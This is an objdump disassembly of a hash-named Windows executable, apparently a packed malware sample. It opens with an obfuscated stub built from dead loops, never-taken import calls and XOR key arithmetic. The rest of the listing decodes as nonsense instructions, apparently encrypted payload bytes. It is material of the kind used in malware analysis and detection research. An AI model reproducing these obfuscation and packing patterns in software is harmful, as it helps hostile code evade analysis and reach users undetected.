
6b207c43b5af9e2c50732736c99340ca596d6a75926d9d99b5895fb6be38200f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42a9bb
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42a9bf
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42a9c3
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42a9cb
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42a9cf
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42a9d3
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42a9d7
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax-0x2458fa21],esi
  4014ce:	call   FWORD PTR [ecx+esi*1]
  4014d1:	add    DWORD PTR [ebx+0x60478383],0xffffff83
  4014d8:	sub    DWORD PTR [edx],0x31
  4014db:	sub    BYTE PTR [esi],bh
  4014dd:	cmp    ah,BYTE PTR es:[eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	or     al,0x73
  4014e7:	jb     0x40155c
  4014e9:	jb     0x401536
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	pop    ebx
  40157c:	and    DWORD PTR [ebx+0x2880cb7f],esp
  401582:	xchg   BYTE PTR [ecx+0x56],cl
  401585:	adc    edx,DWORD PTR [ebx+0x61]
  401588:	dec    esp
  401589:	mov    ds:0xea93d79c,al
  40158e:	clc    
  40158f:	outs   dx,BYTE PTR ds:[esi]
  401590:	fbld   TBYTE PTR [eax]
  401592:	xchg   esp,eax
  401593:	xor    DWORD PTR [esi],ebx
  401595:	out    dx,al
  401596:	stos   DWORD PTR es:[edi],eax
  401597:	jns    0x40160a
  401599:	sar    BYTE PTR [ebx-0x7b],0xc2
  40159d:	jl     0x40152b
  40159f:	push   eax
  4015a0:	inc    eax
  4015a1:	pop    ebp
  4015a2:	pop    es
  4015a3:	mov    bh,0x16
  4015a5:	and    DWORD PTR [eax],eax
  4015a7:	xor    bh,BYTE PTR [edx]
  4015a9:	jle    0x4015d7
  4015ab:	pop    ss
  4015ac:	sub    ebx,DWORD PTR [edi+0x19edc6f9]
  4015b2:	std    
  4015b3:	xor    bl,BYTE PTR [edi]
  4015b5:	sahf   
  4015b6:	aas    
  4015b7:	jnp    0x40161e
  4015b9:	mov    bl,0xbf
  4015bb:	fcomp  st(2)
  4015bd:	stos   BYTE PTR es:[edi],al
  4015be:	xlat   BYTE PTR ds:[ebx]
  4015bf:	call   0xb95b:0x5a54f516
  4015c6:	lods   eax,DWORD PTR ds:[esi]
  4015c7:	mov    dh,0x1b
  4015c9:	inc    esi
  4015ca:	adc    edi,0x4e205cc8
  4015d0:	jecxz  0x4015cb
  4015d2:	shr    DWORD PTR [edx+0x481ab6e9],cl
  4015d8:	aas    
  4015d9:	cli    
  4015da:	out    dx,al
  4015db:	pop    edx
  4015dc:	ror    BYTE PTR [ecx-0x7dddf441],cl
  4015e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015e3:	cs retf 
  4015e5:	or     eax,0xe9d5a135
  4015ea:	and    al,BYTE PTR [eax]
  4015ec:	inc    esi
  4015ed:	adc    DWORD PTR [edx+0x56393f68],0x53
  4015f4:	inc    ebx
  4015f5:	push   0x91cc1678
  4015fa:	xchg   esp,eax
  4015fb:	pop    ecx
  4015fc:	push   ebx
  4015fd:	xchg   DWORD PTR [ebx+ecx*4],edx
  401600:	push   ss
  401601:	ds and dh,dl
  401604:	imul   ecx,DWORD PTR [edx+edx*8-0x3b],0xe
  401609:	addr16 xor eax,0xffffffa8
  40160d:	clc    
  40160e:	inc    esp
  40160f:	dec    ebx
  401610:	clc    
  401611:	sbb    eax,0x7a5d5f76
  401616:	push   esp
  401617:	stos   BYTE PTR es:[edi],al
  401618:	push   eax
  401619:	sub    al,BYTE PTR [edi]
  40161b:	loopne 0x401632
  40161d:	test   eax,0x6f78b538
  401622:	push   edx
  401623:	fistp  QWORD PTR [edx+ecx*1]
  401626:	fldlg2 
  401628:	sub    al,dl
  40162a:	cmp    ecx,DWORD PTR ds:0x5ea0582e
  401630:	mov    ebp,DWORD PTR [ebx+0x12688297]
  401636:	mov    al,0x51
  401638:	not    edi
  40163a:	jnp    0x401603
  40163c:	push   0xa6bdf531
  401641:	int3   
  401642:	int    0x2e
  401644:	or     BYTE PTR [eax+ecx*2+0x17],bh
  401648:	and    cl,BYTE PTR [ebx-0x46770472]
  40164e:	ja     0x401659
  401650:	cli    
  401651:	xor    dh,ah
  401653:	int3   
  401654:	sub    al,0xdd
  401656:	mov    eax,ds:0x9444d25d
  40165b:	test   DWORD PTR [ebx+0x29],edi
  40165e:	sub    al,0xdf
  401660:	jg     0x40163e
  401662:	or     eax,0x450fc76d
  401667:	xchg   esi,eax
  401668:	cmp    al,0xe3
  40166a:	push   0xffffff9a
  40166c:	(bad)  
  40166d:	aas    
  40166e:	or     DWORD PTR [ebp-0x16ad4304],eax
  401674:	loope  0x40161d
  401676:	inc    ebp
  401677:	dec    ebx
  401678:	ret    
  401679:	push   ebp
  40167a:	adc    eax,0x2a2153d3
  40167f:	lds    ebx,FWORD PTR [ecx-0x2b7cd2ee]
  401685:	cmp    al,0x3e
  401687:	or     edi,DWORD PTR [esp+esi*2-0x728548aa]
  40168e:	shr    ecx,0x11
  401691:	repz retf 0x45c0
  401695:	xor    BYTE PTR [edx],ch
  401697:	(bad)
  40169c:	mov    ah,0xfc
  40169e:	add    BYTE PTR [edi-0x31ef2ae],ah
  4016a4:	mov    ds:0xaa491421,al
  4016a9:	inc    ebx
  4016aa:	aam    0x85
  4016ac:	dec    ecx
  4016ad:	mov    ah,ah
  4016af:	jns    0x40167e
  4016b1:	cmp    BYTE PTR [ebp+edx*2-0x52],bl
  4016b5:	xor    bl,bl
  4016b7:	mov    DWORD PTR [ebp-0x38],esi
  4016ba:	ds mov eax,0x7bc90db3
  4016c0:	out    0x1c,al
  4016c2:	mov    esp,DWORD PTR [ecx+ebp*4-0x1f]
  4016c6:	xchg   ebx,eax
  4016c7:	xchg   edx,eax
  4016c8:	repz and al,0xe7
  4016cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016cc:	scas   al,BYTE PTR es:[edi]
  4016cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016ce:	adc    al,0xb6
  4016d0:	mov    esi,0x731be5e5
  4016d5:	jnp    0x4016bc
  4016d7:	icebp  
  4016d8:	or     al,0x1e
  4016da:	outs   dx,DWORD PTR ds:[esi]
  4016db:	loop   0x401699
  4016dd:	or     DWORD PTR ds:[ebx-0x5cb765b6],edx
  4016e4:	push   cs
  4016e5:	and    DWORD PTR [esi],edx
  4016e7:	test   eax,0x48824519
  4016ec:	xor    esp,esp
  4016ee:	test   al,0x1d
  4016f0:	cmp    al,BYTE PTR [edi]
  4016f2:	imul   esp,ecx,0x4d
  4016f5:	scas   al,BYTE PTR es:[edi]
  4016f6:	sbb    cl,BYTE PTR [edi+0x1e838981]
  4016fc:	push   edx
  4016fd:	push   ebx
  4016fe:	sub    al,0xdb
  401700:	mov    ch,0xba
  401702:	pop    edi
  401703:	sub    eax,0xb1631aa
  401708:	adc    dl,dl
  40170a:	cmp    BYTE PTR [ecx-0x30],dl
  40170d:	add    esi,esp
  40170f:	es test eax,0x9449e083
  401715:	or     al,0x8f
  401717:	je     0x4016a4
  401719:	dec    esi
  40171a:	xchg   ebp,eax
  40171b:	mov    dh,0x7d
  40171d:	mov    al,ds:0x9c89d409
  401722:	mov    eax,ds:0x8b5a2bed
  401727:	and    bh,BYTE PTR [edx+0x37]
  40172a:	in     al,dx
  40172b:	lahf   
  40172c:	adc    DWORD PTR [ebx],edi
  40172e:	add    eax,0x7838c33f
  401733:	cmp    al,0xa
  401735:	xor    edx,DWORD PTR [edx]
  401737:	cs mov bl,0x12
  40173a:	sbb    DWORD PTR [ecx+0x1240bc5e],ecx
  401740:	sbb    al,0x23
  401742:	nop
  401743:	in     eax,dx
  401744:	sub    al,0x5
  401746:	(bad)  
  401747:	dec    BYTE PTR [ebx+0x7cecc17f]
  40174d:	sbb    ch,BYTE PTR [ebp+0x2c]
  401750:	xchg   esi,eax
  401751:	cmp    eax,DWORD PTR [eax-0x3274405f]
  401757:	adc    al,0x78
  401759:	xchg   ecx,eax
  40175a:	jbe    0x4017ad
  40175c:	fst    DWORD PTR [ebx+0x7a]
  40175f:	sub    al,0xd5
  401761:	xor    DWORD PTR [ecx+eax*8-0x4a],ecx
  401765:	add    al,0x75
  401767:	ficom  WORD PTR [eax]
  401769:	jne    0x401717
  40176b:	in     eax,0x41
  40176d:	sbb    BYTE PTR [edi],bh
  40176f:	dec    esi
  401770:	or     al,0x50
  401772:	mov    ah,0x2e
  401774:	or     eax,0x2e56c401
  401779:	or     esp,DWORD PTR [ebx]
  40177b:	iret   
  40177c:	mov    al,ds:0x9c47692b
  401781:	mov    edi,0x63e1132a
  401786:	call   0x7ad9:0x2eba2ba6
  40178d:	jge    0x4017c9
  40178f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401790:	sub    BYTE PTR [eax],bh
  401792:	jno    0x40172a
  401794:	popa   
  401795:	ja     0x401740
  401797:	mov    al,ds:0xfb1b0237
  40179c:	fcomp  QWORD PTR [esi+0x78]
  40179f:	lods   al,BYTE PTR ds:[esi]
  4017a0:	stos   BYTE PTR es:[edi],al
  4017a1:	mov    ah,0x7c
  4017a3:	ds dec ebx
  4017a5:	dec    esp
  4017a6:	(bad)  
  4017a7:	cmc    
  4017a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017a9:	push   ebp
  4017aa:	xchg   edx,eax
  4017ab:	fadd   QWORD PTR [ecx-0x5af093cc]
  4017b1:	pop    ds
  4017b2:	call   0xb9dabff4
  4017b7:	sub    DWORD PTR [ecx],edx
  4017b9:	into   
  4017ba:	fwait
  4017bb:	repnz enter 0x2a95,0x23
  4017c0:	enter  0xc593,0x76
  4017c4:	dec    ebp
  4017c5:	jle    0x4017d5
  4017c7:	retf   
  4017c8:	jge    0x4017c2
  4017ca:	std    
  4017cb:	lahf   
  4017cc:	jne    0x401753
  4017ce:	add    eax,0xa9a35e25
  4017d3:	out    0x61,eax
  4017d5:	push   ecx
  4017d6:	les    esi,FWORD PTR [esi-0x27]
  4017d9:	fistp  WORD PTR [eax]
  4017db:	sbb    DWORD PTR [ebx],eax
  4017dd:	daa    
  4017de:	stos   BYTE PTR es:[edi],al
  4017df:	jmp    0xa842:0x9be881b
  4017e6:	into   
  4017e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017e8:	mov    ds:0xa7792973,al
  4017ed:	cdq    
  4017ee:	or     dh,al
  4017f0:	retf   
  4017f1:	jp     0x401821
  4017f3:	pop    ss
  4017f4:	imul   esp,ebp,0x65
  4017f7:	jae    0x40180c
  4017f9:	lea    ecx,[edi]
  4017fb:	test   BYTE PTR [edx],ah
  4017fd:	loope  0x401787
  4017ff:	fmul   st,st(2)
  401801:	pushf  
  401802:	ss in  eax,dx
  401804:	mov    al,0xdd
  401806:	in     al,dx
  401807:	ret    
  401808:	push   es
  401809:	clc    
  40180a:	int    0x27
  40180c:	mov    eax,0xcec1e5b1
  401811:	stc    
  401812:	sbb    BYTE PTR [edi+0x3097b1c],al
  401818:	inc    eax
  401819:	push   esi
  40181a:	stc    
  40181b:	pop    ss
  40181c:	xor    BYTE PTR [esi+eiz*1],dh
  40181f:	pop    ss
  401820:	jmp    0xc1bd:0xfe4295af
  401827:	mov    BYTE PTR [ebx],cl
  401829:	cmp    ebp,DWORD PTR [esi]
  40182b:	sbb    DWORD PTR [eax-0x21022209],ebp
  401831:	xchg   esi,eax
  401832:	ja     0x40181a
  401834:	adc    dh,BYTE PTR gs:[esi+edx*4]
  401838:	adc    bh,0x29
  40183b:	adc    eax,0x2c907eee
  401840:	xor    BYTE PTR [ebp+0x7b],cl
  401843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401844:	or     eax,0x383a45be
  401849:	dec    edx
  40184a:	xlat   BYTE PTR ds:[ebx]
  40184b:	cmc    
  40184c:	and    edi,ebx
  40184e:	loope  0x4017f7
  401850:	xor    cl,BYTE PTR [edx+ecx*8]
  401853:	mov    esi,0x2707fe41
  401858:	fwait
  401859:	rol    al,1
  40185b:	push   DWORD PTR [esi+0x2861c8d8]
  401861:	adc    eax,0x4fccf9e7
  401866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401867:	fwait
  401868:	ss cld 
  40186a:	jb     0x401858
  40186c:	pop    ebx
  40186d:	out    0xd9,eax
  40186f:	mov    ebp,0xd5de3be
  401874:	jmp    0xbde9:0x6df99a2
  40187b:	je     0x401815
  40187d:	or     BYTE PTR [edx+0x5f],bl
  401880:	sbb    al,dh
  401882:	bound  edi,QWORD PTR ds:0xa4bd629b
  401888:	push   ecx
  401889:	fs push cs
  40188b:	adc    bl,BYTE PTR [ecx-0x1afc84b9]
  401891:	lods   al,BYTE PTR ds:[esi]
  401892:	pushf  
  401893:	cld    
  401894:	xlat   BYTE PTR ds:[ebx]
  401895:	mov    eax,0x258d3940
  40189a:	ud2    
  40189c:	mov    edi,0x2d3485c3
  4018a1:	dec    ecx
  4018a2:	mov    ebp,0x3cc17ada
  4018a7:	in     eax,0x18
  4018a9:	inc    esp
  4018aa:	(bad)  
  4018ab:	pop    esi
  4018ac:	nop
  4018ad:	rol    cl,0xfe
  4018b0:	jle    0x40190f
  4018b2:	mov    dl,0x80
  4018b4:	mov    al,ds:0xf9a9b38d
  4018b9:	sbb    al,0x50
  4018bb:	pop    ds
  4018bc:	mov    dh,0xbb
  4018be:	retf   
  4018bf:	lods   al,BYTE PTR ds:[esi]
  4018c0:	jo     0x40189c
  4018c2:	retf   0x122
  4018c5:	fcmovnbe st,st(2)
  4018c7:	adc    al,0xec
  4018c9:	dec    edx
  4018ca:	lods   eax,DWORD PTR es:[esi]
  4018cc:	inc    edi
  4018cd:	pop    ebp
  4018ce:	iret   
  4018cf:	(bad)  
  4018d0:	fiadd  WORD PTR [ebx-0x29bf6e37]
  4018d6:	fild   WORD PTR [esi-0x48293a7e]
  4018dc:	add    al,0xfb
  4018de:	lds    edx,FWORD PTR [ebx+0x7302dfbc]
  4018e4:	sub    ch,BYTE PTR [eax]
  4018e6:	popa   
  4018e7:	push   0x683b5996
  4018ec:	push   ebp
  4018ed:	push   esi
  4018ee:	and    al,0x90
  4018f0:	fimul  DWORD PTR [edx-0x60]
  4018f3:	imul   ebx,DWORD PTR [edx],0x4d
  4018f6:	arpl   WORD PTR ds:0x31e56672,dx
  4018fc:	cwde   
  4018fd:	add    BYTE PTR [ebx],ch
  4018ff:	sbb    al,0x16
  401901:	out    dx,al
  401902:	es fcomp QWORD PTR es:[esi+eax*8+0x2c067f2e]
  40190b:	and    BYTE PTR [edi-0x63],al
  40190e:	adc    esp,eax
  401910:	and    eax,0xf26ca0bb
  401915:	push   ebp
  401916:	call   0x1901:0xd4b2ba49
  40191d:	mov    bh,0xcd
  40191f:	push   ss
  401920:	and    eax,0x5efb3c3
  401925:	inc    ebp
  401926:	aas    
  401927:	and    edx,DWORD PTR [ebx]
  401929:	into   
  40192a:	inc    edi
  40192b:	fadd   QWORD PTR [esi-0x13]
  40192e:	mov    ecx,0xd5dece6f
  401933:	sub    DWORD PTR [edi-0xc],edi
  401936:	fwait
  401937:	mov    bl,0x3c
  401939:	xchg   ecx,eax
  40193a:	jns    0x4018e9
  40193c:	sbb    bl,bh
  40193e:	stos   DWORD PTR es:[edi],eax
  40193f:	xchg   ebp,eax
  401940:	loopne 0x401960
  401942:	push   eax
  401943:	popa   
  401944:	or     ch,BYTE PTR [edi+0x62]
  401947:	(bad)  
  401948:	dec    edi
  401949:	sbb    ch,BYTE PTR [edx]
  40194b:	in     eax,0xb2
  40194d:	pop    esi
  40194e:	idiv   BYTE PTR ds:0x2c0b6064
  401954:	int3   
  401955:	retf   0x3114
  401958:	jge    0x40197f
  40195a:	rcl    DWORD PTR [edi],1
  40195c:	mov    ch,0x10
  40195e:	mov    al,ds:0xae720a6f
  401963:	loopne 0x4019af
  401965:	test   BYTE PTR [edx*4-0x2f3478c],dl
  40196c:	dec    ebx
  40196d:	dec    edx
  40196e:	pop    es
  40196f:	lods   al,BYTE PTR ds:[esi]
  401970:	jecxz  0x40194e
  401972:	pop    ecx
  401973:	push   cs
  401974:	gs stos BYTE PTR es:[edi],al
  401976:	pop    ecx
  401977:	call   0xaa7d920b
  40197c:	mov    ch,0x21
  40197e:	fs push ss
  401980:	lahf   
  401981:	mov    edx,0x57aa53da
  401986:	jp     0x401951
  401988:	mov    al,ds:0xb73a26c0
  40198d:	adc    eax,0x86c5f4fb
  401992:	or     al,0x4e
  401994:	in     al,dx
  401995:	jb     0x401a0c
  401997:	inc    edx
  401998:	je     0x40193a
  40199a:	into   
  40199b:	dec    ecx
  40199c:	push   ebx
  40199d:	sar    BYTE PTR ds:[eax+0x2e],cl
  4019a1:	sub    edi,DWORD PTR [esi+edx*2]
  4019a4:	rol    DWORD PTR [esi-0x76],1
  4019a7:	push   ecx
  4019a8:	mov    ah,0xd7
  4019aa:	imul   edi,DWORD PTR [esi-0x287ba32d],0x1c5b4f8b
  4019b4:	mov    edx,0xccbfd805
  4019b9:	cs dec esp
  4019bb:	cmp    eax,0xa590305b
  4019c0:	mov    ah,0xd
  4019c2:	push   0xd9e44b4c
  4019c7:	lods   eax,DWORD PTR ds:[esi]
  4019c8:	or     esi,DWORD PTR [eax+0x63]
  4019cb:	cli    
  4019cc:	fild   DWORD PTR [edx]
  4019ce:	into   
